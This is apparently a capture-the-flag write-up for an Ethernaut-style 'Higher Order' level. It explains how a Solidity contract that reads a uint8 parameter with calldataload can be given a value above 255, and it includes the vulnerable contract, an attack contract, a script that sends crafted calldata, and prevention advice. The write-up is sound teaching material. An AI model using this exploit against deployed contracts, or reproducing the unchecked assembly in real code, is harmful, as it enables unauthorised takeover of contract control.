# Level 30: Higher Order Challenge

## Challenge Description

Imagine a world where the rules are meant to be broken, and only the cunning and the bold can rise to power. Welcome to the Higher Order, a group shrouded in mystery, where a treasure awaits and a commander rules supreme.

Your objective is to become the Commander of the Higher Order! Good luck!

**Things that might help:**
- Sometimes, calldata cannot be trusted.
- Compilers are constantly evolving into better spaceships.

## Contract Location

The challenge contract is located at:
```
/contracts/level-30-higher-order/HigherOrder.sol
```

## Understanding the Challenge

The HigherOrder contract requires you to become the Commander. To do this, the treasury value must be greater than 255. However, the function to set the treasury accepts only a `uint8` parameter, which has a maximum value of 255.

### The HigherOrder Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract HigherOrder {
    address public commander;
    uint256 public treasury;

    function registerTreasury(uint8) public {
        assembly {
            sstore(treasury_slot, calldataload(4))
        }
    }

    function claimLeadership() public {
        if (treasury > 255) commander = msg.sender;
        else revert("Only members of the Higher Order can become Commander");
    }
}
```

### Key Components

1. **commander**: Address of the current commander (initially zero address)
2. **treasury**: The treasury value (initially 0)
3. **registerTreasury(uint8)**: Sets the treasury value, but uses assembly to read from calldata
4. **claimLeadership()**: Allows you to become commander if treasury > 255

### The Challenge

The paradox:
- To become commander: `treasury > 255`
- Function signature: `registerTreasury(uint8)`
- `uint8` can only hold values 0-255
- How can we set treasury to a value > 255?

## The Vulnerability

The vulnerability lies in a **type mismatch between the function signature and its assembly implementation**.

### The Flawed Logic

```solidity
function registerTreasury(uint8) public {
    assembly {
        sstore(treasury_slot, calldataload(4))
    }
}
```

**The Problem:**
1. Function signature says `uint8` (0-255 range)
2. Assembly code uses `calldataload(4)` which reads 32 bytes!
3. No validation that the value fits in uint8
4. We can craft calldata with a value > 255

### Understanding calldataload

The `calldataload(offset)` opcode:
- Reads 32 bytes from calldata starting at `offset`
- Always returns a `uint256` (full 256-bit value)
- Does NOT respect the parameter type in the function signature
- The function signature is just for ABI encoding, not assembly!

### Calldata Structure

When calling a function with parameters, the calldata looks like:

```
Position   | Content
-----------|------------------------------------------
0x00-0x03  | Function selector (4 bytes)
0x04-0x23  | First parameter (32 bytes, padded)
0x24-0x43  | Second parameter (32 bytes, padded)
...        | More parameters...
```

For `registerTreasury(uint8 value)`:
- Normal call: `registerTreasury(255)`
  - Calldata: `0x211c85ab` + `0x00000000000000000000000000000000000000000000000000000000000000ff`
  - `calldataload(4)` reads: `0x00000000000000000000000000000000000000000000000000000000000000ff` = 255

But we can craft calldata manually!

## The Exploit: Calldata Type Mismatch

### The Key Insight

**Function parameters are enforced by ABI encoding, but assembly operates on raw bytes!**

When we make a normal call through an interface:
1. Solidity checks the parameter type
2. ABI encoder converts `uint8(255)` to 32 bytes
3. Ensures value fits in uint8 range

But when we make a low-level call:
1. We provide raw bytes directly
2. No type checking occurs
3. Assembly reads whatever bytes are there!

### Attack Strategy

```
Step 1: Craft Malicious Calldata
├─ Function selector: keccak256("registerTreasury(uint8)")[0:4]
└─ Parameter: uint256(256) as 32 bytes

Step 2: Make Low-Level Call
├─ Use address(contract).call(malicious_calldata)
└─ Bypass ABI encoding and type checking

Step 3: Assembly Execution
├─ calldataload(4) reads all 32 bytes
├─ Gets value: 256 (or any value we want!)
└─ Stores in treasury: treasury = 256

Step 4: Claim Leadership
├─ treasury > 255 ✓
└─ Become the Commander!
```

### Visual Representation

```
Normal Call (via interface):
┌──────────────┬─────────────────────────────┐
│ What you do  │ registerTreasury(255)       │
├──────────────┼─────────────────────────────┤
│ ABI encoding │ Validates uint8 (max 255)   │
│              │ Encodes to 32 bytes         │
├──────────────┼─────────────────────────────┤
│ Calldata     │ 0x211c85ab + 0x00...00ff    │
├──────────────┼─────────────────────────────┤
│ Assembly     │ calldataload(4) = 255       │
├──────────────┼─────────────────────────────┤
│ Result       │ treasury = 255 ❌           │
└──────────────┴─────────────────────────────┘

Malicious Call (low-level):
┌──────────────┬─────────────────────────────┐
│ What you do  │ address.call(crafted_data)  │
├──────────────┼─────────────────────────────┤
│ ABI encoding │ BYPASSED! Raw bytes sent    │
├──────────────┼─────────────────────────────┤
│ Calldata     │ 0x211c85ab + 0x00...0100    │
├──────────────┼─────────────────────────────┤
│ Assembly     │ calldataload(4) = 256       │
├──────────────┼─────────────────────────────┤
│ Result       │ treasury = 256 ✅           │
└──────────────┴─────────────────────────────┘
```

## Solution Approach

### Method 1: Using Attack Contract

Create a contract that crafts the malicious calldata:

```solidity
contract HigherOrderAttack {
    IHigherOrder public target;
    
    function attack() external {
        // Craft calldata with selector + uint256(256)
        bytes4 selector = bytes4(keccak256("registerTreasury(uint8)"));
        uint256 treasuryValue = 256;
        bytes memory data = abi.encodePacked(selector, treasuryValue);
        
        // Make low-level call
        (bool success,) = address(target).call(data);
        require(success, "Failed");
        
        // Claim leadership
        target.claimLeadership();
    }
}
```

### Method 2: Direct Calldata Manipulation

From a script, craft and send the calldata directly:

```typescript
// Get function selector
const selector = ethers.id("registerTreasury(uint8)").slice(0, 10);

// Craft calldata: selector + uint256(256)
const calldata = ethers.concat([
    selector,
    ethers.zeroPadValue(ethers.toBeHex(256), 32)
]);

// Send transaction with crafted calldata
await signer.sendTransaction({
    to: higherOrderAddress,
    data: calldata
});

// Claim leadership
await higherOrderContract.claimLeadership();
```

## Technical Deep Dive

### 1. Assembly and Type Safety

**Solidity's Type System:**
```solidity
function registerTreasury(uint8 value) public {
    treasury = value;  // Type-safe: value is validated as uint8
}
```
- Solidity ensures `value` fits in uint8
- Automatic bounds checking
- Type safety at compile time

**Assembly Bypasses Type System:**
```solidity
function registerTreasury(uint8) public {
    assembly {
        sstore(treasury_slot, calldataload(4))
    }
}
```
- No type checking in assembly
- `calldataload` always reads 32 bytes
- Parameter type (`uint8`) is ignored!
- Assembly operates on raw storage and calldata

### 2. calldataload Opcode

**EVM Opcode Details:**
- **calldataload(offset)**: Load 32 bytes from calldata at offset
- Returns: `bytes32` (full 256 bits)
- Gas cost: 3 gas
- No bounds checking

**Example:**
```
Calldata: 0x211c85ab0000000000000000000000000000000000000000000000000000000000000100
          ↑ selector  ↑ 32 bytes starting at position 4

calldataload(4) returns:
0x0000000000000000000000000000000000000000000000000000000000000100 = 256
```

### 3. ABI Encoding vs Raw Bytes

**Normal Function Call (ABI Encoded):**
```typescript
// Using interface
contract.registerTreasury(255)

// What happens:
// 1. TypeScript/Solidity validates: 255 is valid uint8 ✓
// 2. ABI encoder creates calldata:
//    - Selector: 0x211c85ab
//    - Param: 0x00000000000000000000000000000000000000000000000000000000000000ff
// 3. Transaction sent with proper encoding
```

**Low-Level Call (Raw Bytes):**
```typescript
// Crafting raw calldata
const calldata = concat([selector, zeroPadValue(toBeHex(256), 32)])

// What happens:
// 1. No validation - we provide raw bytes
// 2. No ABI encoding - we craft it manually
// 3. Can send ANY value, regardless of type
// 4. Assembly reads what we sent!
```

### 4. Why Position 4?

Calldata structure:
```
Bytes 0-3:   Function selector (4 bytes)
Bytes 4-35:  First parameter (32 bytes)
Bytes 36-67: Second parameter (32 bytes)
...
```

`calldataload(4)` starts reading from position 4 = right after selector!

### 5. Storage Slot Access

```solidity
assembly {
    sstore(treasury_slot, calldataload(4))
}
```

- `treasury_slot`: Automatic reference to storage slot of `treasury` variable
- In Solidity 0.6.12, you can reference storage variable names in assembly
- Newer versions require different syntax: `treasury.slot`

## Compiler Evolution

### Solidity 0.6.12 (Challenge Version)

- Less strict about assembly-parameter mismatches
- Allows `treasury_slot` syntax in assembly
- No warnings for type mismatches
- Vulnerable to this type of exploit

### Modern Solidity Versions

**Solidity 0.8.x:**
- Better warnings for assembly code
- Stricter type checking
- Slot access syntax changed: `variable.slot`
- Still vulnerable to low-level call exploits!

**Key Point:** Even with modern compilers, low-level calls can bypass type safety!

### The Compiler Hint

> "Compilers are constantly evolving into better spaceships"

This hint suggests:
1. The vulnerability relates to how older compilers work
2. Newer compilers have improved safeguards
3. But the fundamental issue remains: assembly bypasses types

## Prevention Strategies

### 1. Match Function Signature with Implementation

```solidity
// BAD: Type mismatch
function registerTreasury(uint8) public {
    assembly {
        sstore(treasury_slot, calldataload(4))  // Reads uint256!
    }
}

// GOOD: Types match
function registerTreasury(uint8 value) public {
    treasury = value;  // Solidity handles type safety
}

// GOOD: If you need assembly, validate
function registerTreasury(uint8) public {
    assembly {
        let value := calldataload(4)
        // Validate it fits in uint8
        if gt(value, 0xff) {
            revert(0, 0)
        }
        sstore(treasury_slot, value)
    }
}
```

### 2. Avoid Direct Calldata Manipulation

```solidity
// BAD: Direct calldata access
function processData(uint8 data) public {
    assembly {
        let value := calldataload(4)
        sstore(storage_slot, value)
    }
}

// GOOD: Use Solidity's type system
function processData(uint8 data) public {
    storageVariable = data;  // Type-safe
}
```

### 3. Use Function Parameters Properly

```solidity
// BAD: Unused parameter (compiler warning ignored)
function registerTreasury(uint8) public {
    assembly {
        sstore(treasury_slot, calldataload(4))
    }
}

// GOOD: Use the parameter
function registerTreasury(uint8 value) public {
    treasury = value;
}

// GOOD: If parameter must be unnamed, document why
function registerTreasury(uint8 /* unused */) public {
    // Intentionally using assembly for gas optimization
    // WARNING: Bypasses uint8 validation!
    assembly {
        let value := calldataload(4)
        if gt(value, 0xff) { revert(0, 0) }
        sstore(treasury_slot, value)
    }
}
```

### 4. Input Validation

Always validate inputs, especially when using assembly:

```solidity
function registerTreasury(uint256 value) public {
    require(value <= type(uint8).max, "Value too large");
    assembly {
        sstore(treasury_slot, value)
    }
}
```

### 5. Use Modern Solidity Features

```solidity
// Modern Solidity 0.8.x
function registerTreasury(uint8 value) public {
    treasury = value;
    // Overflow protection built-in
    // Type safety enforced
    // No assembly needed
}
```

### 6. Static Analysis and Testing

Use tools to catch these issues:
- **Slither**: Detects assembly issues
- **Mythril**: Finds type safety problems
- **Echidna/Foundry**: Fuzz testing for edge cases
- **Manual Review**: Always review assembly code carefully

## Deployment and Execution

### Step 1: Deploy the Challenge Contract

```bash
npx hardhat deploy --tags level-30 --network sepolia
```

Or just the instance:
```bash
npx hardhat deploy --tags higher-order --network sepolia
```

### Step 2: Deploy the Attack Contract

With environment variable:
```bash
HIGHER_ORDER_ADDRESS=0xYourAddress \
  npx hardhat deploy --tags higher-order-solution --network sepolia
```

Or deploy both together:
```bash
npx hardhat deploy --tags level-30 --network sepolia
```

### Step 3: Execute the Attack

**Method A: Using the attack contract:**
```bash
ATTACK_CONTRACT_ADDRESS=0xYourAttackAddress \
TARGET_ADDRESS=0xHigherOrderAddress \
  npx hardhat run scripts/level-30-higher-order/attack.ts --network sepolia
```

**Method B: Direct calldata manipulation:**
```bash
TARGET_ADDRESS=0xHigherOrderAddress \
  npx hardhat run scripts/level-30-higher-order/attack.ts --network sepolia
```

## Common Pitfalls

### 1. Not Understanding calldataload

**Mistake:** Thinking calldataload respects parameter types
```solidity
function foo(uint8 x) {
    assembly {
        let val := calldataload(4)  // Gets uint256, not uint8!
    }
}
```

**Fix:** Understand that assembly operates on raw bytes, not types

### 2. Trusting Function Signatures

**Mistake:** Assuming the function signature protects you
```solidity
function foo(uint8 x) {
    assembly {
        sstore(slot, calldataload(4))  // x is ignored!
    }
}
```

**Fix:** Use the parameter, don't bypass it with assembly

### 3. Forgetting Low-Level Calls

**Mistake:** Only testing with normal interface calls
```typescript
// Only testing this
await contract.registerTreasury(255);  // Works as expected

// Not testing this
await signer.sendTransaction({
    to: contractAddress,
    data: craftedCalldata  // Can bypass type safety!
});
```

**Fix:** Test with low-level calls and malformed calldata

### 4. Compiler Version Assumptions

**Mistake:** Thinking newer compiler = safe
- Newer compilers give better warnings
- But low-level calls can still bypass type safety
- Assembly always needs careful validation

**Fix:** Validate even with modern compilers

## Key Lessons

### 1. Assembly Bypasses Type Safety

✅ **What We Learned:**
- Function signatures provide type safety
- ABI encoding enforces parameter types
- But assembly operates on raw bytes!
- `calldataload` reads 32 bytes regardless of parameter type
- Assembly code needs manual validation

### 2. Function Signature ≠ Implementation

✅ **What We Learned:**
- Signature: `registerTreasury(uint8)` suggests 0-255 range
- Implementation: Reads full 32 bytes from calldata
- Mismatch creates vulnerability
- Always ensure implementation matches signature

### 3. Low-Level Calls Bypass Type Checking

✅ **What We Learned:**
- Normal call: `contract.function(param)` → ABI encoded & validated
- Low-level call: `address.call(data)` → raw bytes, no validation
- We can craft any calldata we want
- Contract assembly will process whatever bytes are sent

### 4. Calldata Structure Matters

✅ **What We Learned:**
- Calldata: selector (4 bytes) + parameters (32 bytes each)
- `calldataload(offset)` always reads 32 bytes
- Understanding this is crucial for exploits and defense
- Position matters: offset 4 = first parameter

### 5. Compiler Evolution

✅ **What We Learned:**
- Older compilers (0.6.12): fewer warnings, easier to make mistakes
- Newer compilers: better validation and warnings
- But fundamental issue remains: assembly bypasses type system
- Always validate manually when using assembly

## Real-World Implications

### Historical Vulnerabilities

This type of vulnerability has appeared in real contracts:
1. **Type Confusion**: Mixing parameter types with assembly
2. **Calldata Manipulation**: Crafting non-standard calldata
3. **Compiler Assumptions**: Relying on compiler protection

### Best Practices for Production

1. **Minimize Assembly Use**: Use only when absolutely necessary
2. **Validate All Inputs**: Especially in assembly code
3. **Match Types**: Ensure assembly matches function signature
4. **Test Edge Cases**: Include low-level call tests
5. **Use Latest Compiler**: Get better warnings and checks
6. **Static Analysis**: Run tools like Slither and Mythril
7. **Peer Review**: Always review assembly code carefully
8. **Document Assembly**: Explain why it's needed and what it does

## References

- [Solidity Assembly Documentation](https://docs.soliditylang.org/en/latest/assembly.html)
- [EVM Opcodes](https://www.evm.codes/)
- [ABI Specification](https://docs.soliditylang.org/en/latest/abi-spec.html)
- [Calldata Layout](https://docs.soliditylang.org/en/latest/internals/layout_in_calldata.html)
- [SWC-127: Arbitrary Jump with Function Type Variable](https://swcregistry.io/docs/SWC-127)

## Summary

The Higher Order level teaches us about:
- ✅ The danger of type mismatches between signatures and assembly
- ✅ How `calldataload` always reads 32 bytes regardless of types
- ✅ Assembly bypasses Solidity's type safety system
- ✅ Low-level calls can send arbitrary calldata
- ✅ Why manual validation is crucial in assembly
- ✅ Compiler evolution and its limitations

**The key takeaway: Never trust that function parameters will be validated when using assembly to read calldata. Assembly operates on raw bytes and bypasses all type checking. Always validate manually, or better yet, use Solidity's type system instead of assembly!**
